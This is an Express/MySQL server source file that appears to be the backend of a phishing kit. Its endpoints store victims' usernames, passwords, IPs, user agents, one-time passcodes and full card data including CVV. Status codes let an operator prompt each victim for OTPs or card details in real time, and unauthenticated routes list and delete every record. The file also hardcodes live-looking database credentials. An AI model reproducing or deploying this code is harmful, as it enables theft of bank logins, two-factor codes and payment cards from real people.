const express = require('express');
const mysql = require('mysql');
const bodyparser = require('body-parser');
const axios = require('axios');
var cors = require('cors');

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyparser.json());

var mysqlConnection = mysql.createConnection({
    host: 'sql4.freemysqlhosting.net',
    user: 'sql4465442',
    password: 'ViegkeaZKG',
    database: 'sql4465442',
    multipleStatements: true
})

mysqlConnection.connect((err) => {
    if (!err) {
        console.log("Db Connection Succeed");
    }
    else {
        console.log("Db connect Failed \n Error :" + JSON.stringify(err, undefined, 2));
    }
});

app.get('/customers', (req, res) => {

    mysqlConnection.query('SELECT * FROM customers', (err, rows, fields) => {
        if (!err)
            res.send(rows);
        else
            console.log(err);

    })
});

app.options('/submitted', cors())

app.post('/submitted', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;
    newStatus = req.body.status;

    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.options('/command', cors())

app.post('/command', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;
    newStatus = req.body.status;
    phoneNumber = req.body.phoneNumber;

    if (newStatus == 8) {
        let details = [newStatus, phoneNumber, uniqueid];
        let query = `UPDATE customers SET status=?, part_number=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
    if (newStatus == 7) {
        let details = [newStatus, uniqueid];
        let query = `UPDATE customers SET status=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
    if (newStatus == 6) {
        let details = [newStatus, uniqueid];
        let query = `UPDATE customers SET status=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
    if (newStatus == 5) {
        let details = [newStatus, uniqueid];
        let query = `UPDATE customers SET status=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
    if (newStatus == 4) {
        let details = [newStatus, uniqueid];
        let query = `UPDATE customers SET status=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
    if (newStatus == 9) {
        let details = [newStatus, uniqueid];
        let query = `UPDATE customers SET status=? WHERE uniqueid=?`

        mysqlConnection.query(query, details, (err, rows, fields) => {
            if (!err)
                res.send("Update Completed");
            else
                console.log(err);

        })
    }
});

app.get('/customers/:id', (req, res) => {
    uniqueid = req.params.id;

    let details = [uniqueid];
    let query = `SELECT * FROM customers WHERE uniqueid=?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send(rows);
        else
            console.log(err);

    })
});

app.options('/login', cors())

app.post('/login', cors(), (req, res) => {
    username = req.body.username;
    password = req.body.securityNumber;
    ua = req.body.ua;
    ip = req.body.ip;
    uniqueid = req.body.uniqueid;

    let details = [username, password, ip, ua, uniqueid];
    let query = `INSERT INTO customers(username,password,ip,useragent,uniqueid,status) VALUES (?,?,?,?,?,1)`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Insertion Completed");
        else
            console.log(err);

    })
});

app.options('/loginagain', cors())

app.post('/loginagain', cors(), (req, res) => {
    username = req.body.username;
    password = req.body.securityNumber;
    uniqueid = req.body.uniqueid;

    let details = [username, password, uniqueid];
    let query = `UPDATE customers SET username=?, password=?, status=1, buzzed=0 WHERE uniqueid=?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Insertion Completed");
        else
            console.log(err);

    })
});

app.options('/askotp', cors())

app.post('/askotp', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;

    let details = [uniqueid];
    let query = `UPDATE customers SET status=13, buzzed=0 WHERE uniqueid= ?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.options('/saveotp', cors())

app.post('/saveotp', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;
    code = req.body.code;

    let details = [code, uniqueid];
    let query = `UPDATE customers SET otpcode= ?, status=1, buzzed=0 WHERE uniqueid= ?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.post('/savepasscode', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;
    passcode = req.body.passcode;

    let details = [passcode, uniqueid];
    let query = `UPDATE customers SET passcode= ?, status=1, buzzed=0 WHERE uniqueid= ?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.options('/deleteentry/:id', cors())

app.post('/deleteentry/:id', cors(), (req, res) => {
    uniqueid = req.params.id;

    let details = [uniqueid];
    let query = `DELETE FROM customers WHERE uniqueid= ?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.options('/card', cors())

app.post('/card', cors(), (req, res) => {
    uniqueid = req.body.uniqueid;
    ccname = req.body.ccname;
    ccnum = req.body.ccnum;
    ccexp = req.body.ccexp;
    cccvv = req.body.cccvv;

    let details = [ccname, ccnum, ccexp, cccvv, uniqueid];
    let query = `UPDATE customers SET ccname=?, ccnum=?, ccexp=?, cccvv=?, status=1, buzzed=0 WHERE uniqueid= ?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.get('/status/:id', (req, res) => {
    uniqueid = req.params.id;

    let details = [uniqueid];
    let query = `SELECT status FROM customers WHERE uniqueid=?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send(rows);
        else
            console.log(err);

    })
});

app.get('/wait', (req, res) => {
    uniqueid = req.body.uniqueid;

    let details = [uniqueid];
    let query = `UPDATE customers SET status=0 WHERE uniqueid=?`

    mysqlConnection.query(query, details, (err, rows, fields) => {
        if (!err)
            res.send("Update Completed");
        else
            console.log(err);

    })
});

app.listen(port, () => console.log(`Started server at port ` + port));